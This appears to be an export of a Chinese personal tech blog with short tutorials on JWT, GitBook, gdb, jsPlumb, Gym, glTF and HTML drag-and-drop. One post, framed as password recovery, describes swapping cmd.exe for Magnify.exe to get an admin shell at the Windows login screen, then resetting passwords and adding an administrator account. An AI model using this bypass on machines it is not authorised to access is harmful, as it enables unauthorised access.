<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; get the decoded payload ignoring signature, no secretOrPrivateKey needed</span><br><span class="line">var decoded &#x3D; jwt.decode(token);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; get the decoded payload and header</span><br><span class="line">var decoded &#x3D; jwt.decode(token, &#123;complete: true&#125;);</span><br><span class="line">console.log(decoded.header);</span><br><span class="line">console.log(decoded.payload)</span><br></pre></td></tr></table></figure>

<h1 id="express-jwt的使用"><a href="#express-jwt的使用" class="headerlink" title="express-jwt的使用"></a>express-jwt的使用</h1><h2 id="安装帮助"><a href="#安装帮助" class="headerlink" title="安装帮助"></a>安装帮助</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install express-jwt --save</span><br></pre></td></tr></table></figure>

<h2 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.use(expressJWT(&#123;</span><br><span class="line">    secret: appConfig.secretOrPrivateKey</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.use(function(err, req, res, next) &#123;</span><br><span class="line">    console.log(err);</span><br><span class="line">    if (err.name &#x3D;&#x3D;&#x3D; &#39;UnauthorizedError&#39;) &#123;</span><br><span class="line">        res.status(err.status || 401).send(err.message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.jianshu.com/p/576dbf44b2ae" target="_blank" rel="noopener">什么是 JWT – JSON WEB TOKEN</a>, by Dearmadman</li>
<li><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">JSON Web Token 入门教程</a>,by 阮一峰.</li>
<li><a href="https://huangwang.github.io/2018/07/08/Cookie-Session%E5%92%8CToken%E4%BC%9A%E8%AF%9D%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/">Cookie,Session和Token会话知识整理</a>,by jack huang.</li>
<li><a href="https://github.com/auth0/node-jsonwebtoken" target="_blank" rel="noopener">node-jsonwebtoken</a>,by auth0.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows忘记密码无法登录的解决方案</title>
    <url>/2019/10/09/Windows%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81%E6%97%A0%E6%B3%95%E7%99%BB%E5%BD%95%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>突然需要在一台很久不用的Win7计算机上差一点资料，可忘记了登录密码，只能重置密码。过程记录如下：</p>
<h1 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h1><p>借助手头的一张linux live cd，从光盘启动，进入linux系统，然后找到windows系统盘分区，在C:\Windows\System32下，将cmd.exe重命名为Magnify.exe，然后系统重启，登录Windows操作系统，在登录界面中，调用辅助工具放大镜，即打开命令提示符，输入如下命令重置Windows账户密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 查看Windows账户</span><br><span class="line">net user</span><br><span class="line">&#x2F;&#x2F; 修改Windows账户密码</span><br><span class="line">net user Administrator 123456</span><br><span class="line">&#x2F;&#x2F; 重启系统用Administrator账户登录</span><br><span class="line">shutdown -r -t 00</span><br></pre></td></tr></table></figure>

<p>或者采用如下命令新建登录账户：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 创建用户</span><br><span class="line">net user test 123456 &#x2F;add</span><br><span class="line">&#x2F;&#x2F; 用户提权，加入管理员组</span><br><span class="line">net localgroup Administrators test &#x2F;add</span><br><span class="line">&#x2F;&#x2F; 使用完删除用户</span><br><span class="line">net user test &#x2F;delete</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/cx1990820/article/details/72628241" target="_blank" rel="noopener">关闭windows默认共享</a>,by Blue_sky90.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机安全</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>flypath3d使用方法简介</title>
    <url>/2021/05/17/flypath3d%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>做科研的小伙伴们在使用matlab绘制飞行器轨迹时，总是感叹大牛绘制的图美观大方，而自己绘制的图则简陋到了极点。但现在有了flypath3d，导师再也不用担心我的绘图了。</p>
<p align="center">
    <img src="images/graph_aircraft_2.png" width="90%" alt="飞行器轨迹"/>
</p>
<center>图1 飞行器轨迹</center>

<h1 id="flypath3d简介"><a href="#flypath3d简介" class="headerlink" title="flypath3d简介"></a>flypath3d简介</h1><p>flypath3d打包了一个免费的Matlab软件，用于导弹和空中目标轨迹的3D可视化，为计算机仿真提供了可视参考。 由于其多功能性和易用性，该软件可以帮助产生有吸引力的演示文稿，以用于各种科学或公共宣传目的。该软件可免费用于科学和教育用途。 您也可以出于任何目的修改和/或分发此软件。 但是，使用包装时，请记住引用该论文。</p>
<h1 id="flypath3d安装"><a href="#flypath3d安装" class="headerlink" title="flypath3d安装"></a>flypath3d安装</h1><p>该包由使用“ package_setup”命令安装在Matlab环境中的几个M代码文件组成。 它提供了通过放置连续的对象来构造复杂的3D场景的功能，这些对象实际上在布局中起到了构建块的作用。</p>
<p>下载flypath3d软件包并将其解压缩到目标目录。 接下来执行配置脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package_setup</span><br></pre></td></tr></table></figure>

<p>这样，flypath3d就安装好了，可以开始使用它了。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://www.wbint.pl/flypath3d/" target="_blank" rel="noopener">flypath3d</a>,by Witold Bużantowicz.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>glTF2.0格式解析</title>
    <url>/2019/12/25/gltf2-0%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<p>glTF（GL传输格式的衍生简称）是一种使用JSON标准的3D场景和模型的文件格式。 它是Khronos Group 3D格式工作组开发的一种与API无关的运行时资产交付格式。 它在HTML5DevConf 2016上宣布。此格式旨在成为一种高效，可互操作的格式，具有最小的文件大小和应用程序对运行时的处理。 因此，其创建者将其描述为“3D JPEG”。 glTF还为3D内容工具和服务定义了一种通用的发布格式。本文旨通过对glTF2.0格式的解析，进一步加深对3D建模的理解。</p>
<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>在对glTF2.0格式解析之前，应先了解一些3D建模或glTF独有的基本概念：</p>
<ul>
<li>scenes, nodes：场景的基本结构</li>
<li>cameras：场景的可视配置</li>
<li>meshes：构成3D对象的几何</li>
<li>buﬀers, buﬀerViews, accessors：数据参考和布局描述</li>
<li>materials：定义数据如何被渲染</li>
<li>textures, images, samplers：对象表面显示</li>
<li>skins：顶点蒙皮信息</li>
<li>animations：随时间改变的属性</li>
</ul>
<p align="center">
    <img src="images/concept_relation.jpg" width="60%" alt="glTF概念之间的关系"/>
</p>
<center>图1 glTF概念之间的关系</center>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://github.com/KhronosGroup/glTF" target="_blank" rel="noopener">glTF</a>,by KhronosGroup.</li>
<li><a href="https://en.wikipedia.org/wiki/GlTF" target="_blank" rel="noopener">glTF</a>,by wikipedia.</li>
<li><a href="https://www.khronos.org/files/gltf20-reference-guide.pdf" target="_blank" rel="noopener">glTF Overview</a>,by KhronosGroup.</li>
<li><a href="https://gameinstitute.qq.com/community/detail/127900" target="_blank" rel="noopener">骨骼蒙皮动画(SkinnedMesh)的原理解析</a>,by feng.</li>
<li><a href="https://blog.csdn.net/yongh701/article/details/73001312" target="_blank" rel="noopener">【Unity3D】3D模型的使用——FBX的使用与Animation设置</a>,by yongh701.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title>GitBook入门教程</title>
    <url>/2019/12/26/gitbook%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>GitBook是一种制作在线书籍的工具。它基于Git支持多人协作，支持将采用Markdown语法编辑的文档导出成 PDF，EPUB，HTML等多种格式。</p>
<h1 id="GitBook安装"><a href="#GitBook安装" class="headerlink" title="GitBook安装"></a>GitBook安装</h1><h2 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h2><ul>
<li>NodeJS (v4.0.0 and above is recommended)</li>
<li>Windows, Linux, Unix, or Mac OS X</li>
</ul>
<h2 id="NPM安装GitBook"><a href="#NPM安装GitBook" class="headerlink" title="NPM安装GitBook"></a>NPM安装GitBook</h2><p>通过NPM工具安装GitBook是最佳的方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install gitbook-cli -g</span><br><span class="line">$ gitbook init &#x2F;&#x2F;下载稳定版的gitbook，同时创建在线书籍</span><br></pre></td></tr></table></figure>

<p>gitbook-cli工具可安装多个GitBook版本到系统上。对于Windows平台，gitbook-cli工具安装的多个GitBook版本通常存储在“C:\Users\CurrentLoginUser\.gitbook”。</p>
<h2 id="离线安装GitBook"><a href="#离线安装GitBook" class="headerlink" title="离线安装GitBook"></a>离线安装GitBook</h2><p>内网机器上安装GitBook的方法如下：</p>
<ul>
<li>安装最新Nodejs长期支持版。</li>
<li>使用npm-bundle命令在线打包gitbook-cli</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install npm-bundle -g</span><br><span class="line">npm-bundle gitbook-cli</span><br></pre></td></tr></table></figure>

<ul>
<li>内网机器上安装gitbook-cli</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install .&#x2F;gitbook-cli.tgz</span><br></pre></td></tr></table></figure>

<ul>
<li>将“C:\Users\CurrentLoginUser\.gitbook”目录打包拷贝至内网机器对应位置</li>
</ul>
<h1 id="创建书籍"><a href="#创建书籍" class="headerlink" title="创建书籍"></a>创建书籍</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gitbook init    &#x2F;&#x2F;在当前目录创建书籍</span><br><span class="line">$ gitbook build   &#x2F;&#x2F;构建在线书籍网站</span><br><span class="line">$ gitbook serve   &#x2F;&#x2F;构建在线书籍网站并启动</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/lu_embedded/article/details/81100704" target="_blank" rel="noopener">GitBook 从懵逼到入门</a>,by 阿基米东.</li>
<li><a href="https://yq.aliyun.com/articles/384086" target="_blank" rel="noopener">使用 Gitbook 打造你的电子书</a>,by 文艺小青年.</li>
<li><a href="https://www.icharm.me/%E4%B8%96%E4%B8%8A%E6%9C%80%E4%BD%B3%E7%A6%BB%E7%BA%BFmakedown%E7%BC%96%E8%BE%91%E5%B7%A5%E5%85%B7%EF%BC%88gitbook%E5%92%8Cgitbook-editor%EF%BC%89.html" target="_blank" rel="noopener">世上最佳离线markdown编辑工具（gitbook和gitbook editor）</a>,by icharm.</li>
<li><a href="https://blog.tedxiong.com/how_to_remove_Published_with_GitBook_in_GitBook.html" target="_blank" rel="noopener">移除GitBook目录下方的“本书使用GitBook发布”字样</a>,by tedxiong.</li>
<li><a href="https://www.cnblogs.com/powercto/p/6917106.html" target="_blank" rel="noopener">EbookError: Error during ebook generation: ‘ebook-convert</a>,by 狼爷.</li>
<li><a href="http://gitbook.wiliam.me/bookjson.html" target="_blank" rel="noopener">书籍配置文件(book.json)</a>,by wiliam.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>gdb调试入门</title>
    <url>/2019/06/23/gdb%E8%B0%83%E8%AF%95%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>GDB是一个由GNU开源组织发布的、UNIX/LINUX操作系统下的、基于命令行的、功能强大的程序调试工具。 对于一名Linux下工作的c++程序员，gdb是必不可少的工具。</p>
<h1 id="启动gdb"><a href="#启动gdb" class="headerlink" title="启动gdb"></a>启动gdb</h1><p>对C/C++程序的调试，需要在编译前就加上-g选项。对大型项目，一般选择Debug选项进行编译以 方便gdb调试。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ g++ -g hello.cpp -o hello</span><br></pre></td></tr></table></figure>

<p>调试可执行文件:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gdb &lt;program&gt;</span><br></pre></td></tr></table></figure>

<p>program也就是你的执行文件，一般在当前目录下。</p>
<h1 id="gdb交互命令"><a href="#gdb交互命令" class="headerlink" title="gdb交互命令"></a>gdb交互命令</h1><p>启动gdb后，进入到交互模式，通过以下命令完成对程序的调试；注意高频使用的命令一般都会有缩写，熟练使用这些缩写命令能提高调试的效率；</p>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><ul>
<li>run：简记为 r ，其作用是运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令。</li>
<li>continue （简写c ）：继续执行，到下一个断点处（或运行结束）</li>
<li>next：（简写 n），单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，而 next 则直接调用函数，不会进入到函数体内。</li>
<li>step （简写s）：单步调试如果有函数调用，则进入函数；与命令n不同，n是不进入调用的函数的</li>
<li>until：当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体。</li>
<li>until+行号： 运行至某行，不仅仅用来跳出循环</li>
<li>finish： 运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息。</li>
<li><strong>call 函数(参数)：调用程序中可见的函数，并传递“参数”，如：call gdb_test(55)</strong></li>
<li>quit：简记为 q ，退出gdb</li>
</ul>
<h2 id="设置断点"><a href="#设置断点" class="headerlink" title="设置断点"></a>设置断点</h2><ul>
<li><strong>break n （简写b n）:在第n行处设置断点</strong><br>（可以带上代码路径和代码名称： b OAGUPDATE.cpp:578）</li>
<li>b fn1 if a＞b：条件断点设置</li>
<li>break func（break缩写为b）：在函数func()的入口处设置断点，如：break cb_button</li>
<li>delete 断点号n：删除第n个断点</li>
<li>disable 断点号n：暂停第n个断点</li>
<li>enable 断点号n：开启第n个断点</li>
<li>clear 行号n：清除第n行的断点</li>
<li>info b （info breakpoints） ：显示当前程序的断点设置情况</li>
<li>delete breakpoints：清除所有断点</li>
</ul>
<h2 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h2><ul>
<li>list ：简记为 l ，其作用就是列出程序的源代码，默认每次显示10行。</li>
<li>list 行号：将显示当前文件以“行号”为中心的前后10行代码，如：list 12</li>
<li>list 函数名：将显示“函数名”所在函数的源代码，如：list main</li>
<li>list ：不带参数，将接着上一次 list 命令的，输出下边的内容。</li>
</ul>
<h2 id="打印表达式"><a href="#打印表达式" class="headerlink" title="打印表达式"></a>打印表达式</h2><ul>
<li>print 表达式：简记为 p ，其中“表达式”可以是任何当前正在被测试程序的有效表达式，比如当前正在调试C语言的程序，那么“表达式”可以是任何C语言的有效表达式，包括数字，变量甚至是函数调用。</li>
<li>print a：将显示整数 a 的值</li>
<li>print ++a：将把 a 中的值加1,并显示出来</li>
<li>print name：将显示字符串 name 的值</li>
<li>print gdb_test(22)：将以整数22作为参数调用 gdb_test() 函数</li>
<li>print gdb_test(a)：将以变量 a 作为参数调用 gdb_test() 函数</li>
<li>display 表达式：在单步运行时将非常有用，使用display命令设置一个表达式后，它将在每次单步进行指令后，紧接着输出被设置的表达式及值。如： display a</li>
<li>watch 表达式：设置一个监视点，一旦被监视的“表达式”的值改变，gdb将强行终止正在被调试的程序。如： watch a</li>
<li>whatis ：查询变量或函数</li>
<li>info function： 查询函数</li>
<li>扩展info locals： 显示当前堆栈页的所有变量</li>
</ul>
<h2 id="查询运行信息"><a href="#查询运行信息" class="headerlink" title="查询运行信息"></a>查询运行信息</h2><ul>
<li>where/bt ：当前运行的堆栈列表；</li>
<li>bt backtrace 显示当前调用堆栈</li>
<li>up/down 改变堆栈显示的深度</li>
<li><strong>set args 参数:指定运行时的参数</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set args -l a -C abc</span><br><span class="line">set args -l&#x3D;a -C&#x3D;abc</span><br></pre></td></tr></table></figure>

<ul>
<li>show args：查看设置好的参数</li>
<li>info program： 来查看程序的是否在运行，进程号，被暂停的原因。</li>
</ul>
<h2 id="分割窗口"><a href="#分割窗口" class="headerlink" title="分割窗口"></a>分割窗口</h2><ul>
<li>layout：用于分割窗口，可以一边查看代码，一边测试：</li>
<li>layout src：显示源代码窗口</li>
<li>layout asm：显示反汇编窗口</li>
<li>layout regs：显示源代码/反汇编和CPU寄存器窗口</li>
<li>layout split：显示源代码和反汇编窗口</li>
<li>Ctrl + L：刷新窗口</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/gdb.html" target="_blank" rel="noopener">gdb 调试利器</a>,by Linux Tools Quick Tutorial.</li>
<li><a href="https://blog.csdn.net/blacet/article/details/52385955" target="_blank" rel="noopener">GDB调试带参数的程序（转载＋整理+实践）</a>,by blacet.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>jsplumb学习笔记</title>
    <url>/2021/02/02/jsplumb%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>jsPlumb 是一个用于在 html 元素之间生成连接线的 javascript 库。类似的工具还有 jointjs、GoJS、mxGraph 等。下面简单介绍jsplumb的相关内容。</p>
<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><ul>
<li>Souce 源节点</li>
<li>Target 目标节点</li>
<li>Anchor 锚点</li>
<li>Endpoint 端点</li>
<li>Connector 连接</li>
<li>Overlay 连接装饰</li>
</ul>
<h1 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jsPlumb.ready(function() &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#x2F;&#x2F; your jsPlumb related init code goes here</span><br><span class="line">    ...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h1 id="创建实例"><a href="#创建实例" class="headerlink" title="创建实例"></a>创建实例</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var firstInstance &#x3D; jsPlumb.getInstance();</span><br><span class="line"></span><br><span class="line">firstInstance.importDefaults(&#123;</span><br><span class="line">  Connector : [ &quot;Bezier&quot;, &#123; curviness: 150 &#125; ],</span><br><span class="line">  Anchors : [ &quot;TopCenter&quot;, &quot;BottomCenter&quot; ]</span><br><span class="line">&#125;);</span><br><span class="line">  </span><br><span class="line">firstInstance.connect(&#123;</span><br><span class="line">  source:&quot;element1&quot;, </span><br><span class="line">  target:&quot;element2&quot;, </span><br><span class="line">  scope:&quot;someScope&quot; </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">var secondInstance &#x3D; jsPlumb.getInstance(&#123;</span><br><span class="line">  PaintStyle:&#123; </span><br><span class="line">    strokeWidth:6, </span><br><span class="line">    stroke:&quot;#567567&quot;, </span><br><span class="line">    outlineStroke:&quot;black&quot;, </span><br><span class="line">    outlineWidth:1 </span><br><span class="line">  &#125;,</span><br><span class="line">  Connector:[ &quot;Bezier&quot;, &#123; curviness: 30 &#125; ],</span><br><span class="line">  Endpoint:[ &quot;Dot&quot;, &#123; radius:5 &#125; ],</span><br><span class="line">  EndpointStyle : &#123; fill: &quot;#567567&quot;  &#125;,</span><br><span class="line">  Anchor : [ 0.5, 0.5, 1, 1 ]</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br><span class="line">secondInstance.connect(&#123; </span><br><span class="line">  source:&quot;element4&quot;, </span><br><span class="line">  target:&quot;element3&quot;, </span><br><span class="line">  scope:&quot;someScope&quot;   </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://wdd.js.org/jsplumb-chinese-tutorial/#/" target="_blank" rel="noopener">jsplumb 中文基础教程</a>,by wangduanduan.</li>
<li><a href="https://segmentfault.com/a/1190000018371243" target="_blank" rel="noopener">记一次绘图框架技术选型: jsPlumb VS mxGraph</a>,by yejinzhan.</li>
<li><a href="https://docs.jsplumbtoolkit.com/community/current/index.html" target="_blank" rel="noopener">jsPlumb Community Edition</a>,by jsplumbtoolkit.</li>
<li><a href="https://shawchen08.github.io/2019/03/21/jsPlumb-docs/" target="_blank" rel="noopener">jsPlumb 文档翻译</a>,by shawchen08.</li>
<li><a href="https://ustbhuangyi.github.io/vue-analysis/v2/prepare/" target="_blank" rel="noopener">Vue.js 技术揭秘</a>,by huangyi.</li>
<li><a href="https://stackoverflow.com/questions/22230983/jsplumb-connection-event-is-triggering-more-than-once" target="_blank" rel="noopener">jsPlumb Connection event is triggering more than once</a>,by stackflow.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>js创建对象的方法汇总</title>
    <url>/2023/03/20/js%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<p>以下是几种创建js对象的方法。</p>
<h1 id="Object构造函数创建"><a href="#Object构造函数创建" class="headerlink" title="Object构造函数创建"></a>Object构造函数创建</h1><h1 id="使用对象字面量表示法来创建对象"><a href="#使用对象字面量表示法来创建对象" class="headerlink" title="使用对象字面量表示法来创建对象"></a>使用对象字面量表示法来创建对象</h1><h1 id="使用工厂模式创建对象"><a href="#使用工厂模式创建对象" class="headerlink" title="使用工厂模式创建对象"></a>使用工厂模式创建对象</h1><h1 id="使用构造函数创建对象"><a href="#使用构造函数创建对象" class="headerlink" title="使用构造函数创建对象"></a>使用构造函数创建对象</h1><h1 id="原型创建对象模式"><a href="#原型创建对象模式" class="headerlink" title="原型创建对象模式"></a>原型创建对象模式</h1><h1 id="组合使用构造函数模式和原型模式"><a href="#组合使用构造函数模式和原型模式" class="headerlink" title="组合使用构造函数模式和原型模式"></a>组合使用构造函数模式和原型模式</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://juejin.cn/post/6844903616512278536" target="_blank" rel="noopener">JS创建对象的几种方法</a>,by fishfan.</li>
<li><a href="https://www.ruanyifeng.com/blog/2012/07/three_ways_to_define_a_javascript_class.html" target="_blank" rel="noopener">Javascript定义类（class）的三种方法</a>,by 阮一峰.</li>
<li><a href="https://juejin.cn/post/7098891689955164168" target="_blank" rel="noopener">JavaScript Class类详解</a>,by 前端农民晨曦.</li>
<li><a href="https://zhuanlan.zhihu.com/p/35458229" target="_blank" rel="noopener">理解JS的prototype</a>,by 登来.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>gym使用帮助</title>
    <url>/2021/06/13/gym%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9/</url>
    <content><![CDATA[<p>Gym 是一个用于开发和比较强化学习算法的工具包。 它支持从步行到玩 Pong 或 Pinball 等游戏的代理的训练工作。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>从库安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install gym</span><br></pre></td></tr></table></figure>

<p>从源安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;openai&#x2F;gym</span><br><span class="line">cd gym</span><br><span class="line">pip install -e .</span><br></pre></td></tr></table></figure>

<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import gym</span><br><span class="line">env &#x3D; gym.make(&#39;CartPole-v0&#39;)</span><br><span class="line">env.reset()</span><br><span class="line">for _ in range(1000):</span><br><span class="line">    env.render()</span><br><span class="line">    env.step(env.action_space.sample()) # take a random action</span><br><span class="line">env.close()</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://gym.openai.com/docs/" target="_blank" rel="noopener">gym doc</a>,by openai.</li>
<li><a href="https://blog.csdn.net/qq_32892383/article/details/89576003" target="_blank" rel="noopener">OpenAI Gym 经典控制环境介绍——CartPole（倒立摆</a>,by 思绪无限.</li>
<li><a href="https://towardsdatascience.com/beginners-guide-to-custom-environments-in-openai-s-gym-989371673952" target="_blank" rel="noopener">Beginner’s Guide to Custom Environments in OpenAI’s Gym</a>,by Mate Pocs.</li>
<li><a href="https://medium.com/analytics-vidhya/solving-openai-gym-environments-with-matlab-rl-toolbox-fb9d9e06b593" target="_blank" rel="noopener">Solving OpenAI Gym Environments with MATLAB RL Toolbox</a>,by Paulo Carvalho.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>js拖放功能的实现</title>
    <url>/2020/09/03/js%E6%8B%96%E6%94%BE%E5%8A%9F%E8%83%BD%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<p>拖放是网页中一种很常见的交互手段。下面简单介绍使用js实现拖放功能的方法。</p>
<h1 id="拖放流程"><a href="#拖放流程" class="headerlink" title="拖放流程"></a>拖放流程</h1><p>拖放元素的流程如下：</p>
<p>选中元素—&gt;拖动元素—&gt;释放元素</p>
<p>下面介绍上述拖放元素流程的具体实现方法。</p>
<h2 id="选中元素"><a href="#选中元素" class="headerlink" title="选中元素"></a>选中元素</h2><p>在HTML5标准中，为了使元素可拖动，把draggable属性设置为true。文本、图片和链接是默认可以拖放的，它们的draggable属性自动被设置成了true。图片和链接按住鼠标左键选中，就可以拖放。文本只有在被选中的情况下才能拖放。如果显示设置文本的draggable属性为true，按住鼠标左键也可以直接拖放。</p>
<p>draggable属性：设置元素是否可拖动。语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;element draggable&#x3D;&quot;true | false | auto&quot; &gt;</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<ul>
<li>true: 可以拖动  </li>
<li>false: 禁止拖动  </li>
<li>auto: 跟随浏览器定义是否可以拖动</li>
</ul>
<h2 id="拖动元素"><a href="#拖动元素" class="headerlink" title="拖动元素"></a>拖动元素</h2><p>每一个可拖动的元素，在拖动过程中，都会经历三个过程，拖动开始–&gt;拖动过程中–&gt; 拖动结束。</p>
<table>
<thead>
<tr>
<th>针对对象</th>
<th>事件名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>被拖动的元素</td>
<td>dragstart</td>
<td>在元素开始被拖动时候触发</td>
</tr>
<tr>
<td></td>
<td>drag</td>
<td>在元素被拖动时反复触发</td>
</tr>
<tr>
<td></td>
<td>dragend</td>
<td>在拖动操作完成时触发</td>
</tr>
<tr>
<td>目的地对象</td>
<td>dragenter</td>
<td>当被拖动元素进入目的地元素所占据的屏幕空间时触发</td>
</tr>
<tr>
<td></td>
<td>dragover</td>
<td>当被拖动元素在目的地元素内时触发</td>
</tr>
<tr>
<td></td>
<td>dragleave</td>
<td>当被拖动元素没有放下就离开目的地元素时触发</td>
</tr>
</tbody></table>
<h2 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h2><p>到达目的地之后，释放元素事件</p>
<table>
<thead>
<tr>
<th>针对对象</th>
<th>事件名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>目的地对象</td>
<td>drop</td>
<td>当被拖动元素在目的地元素里放下时触发，一般需要取消浏览器的默认行为。</td>
</tr>
</tbody></table>
<h1 id="DataTransfer对象"><a href="#DataTransfer对象" class="headerlink" title="DataTransfer对象"></a>DataTransfer对象</h1><p>与拖放操作所触发的事件同时派发的对象是DragEvent，它派生于MouseEvent，具有Event与MouseEvent对象的所有功能，并增加了dataTransfer属性。该属性用于保存拖放的数据和交互信息，返回DataTransfer对象。</p>
<p>DataTransfer对象常用的属性和方法如下：</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>types</td>
<td>只读属性。它返回一个我们在dragstart事件中设置的拖动数据格式的数组。 格式顺序与拖动操作中包含的数据顺序相同。IE10+、Edge、safari3.1、Firefox3.5+ 和Chrome4以上支持该属性</td>
</tr>
<tr>
<td>files</td>
<td>返回拖动操作中的文件列表。包含一个在数据传输上所有可用的本地文件列表。如果拖动操作不涉及拖动文件，此属性是一个空列表。</td>
</tr>
<tr>
<td>dropEffect</td>
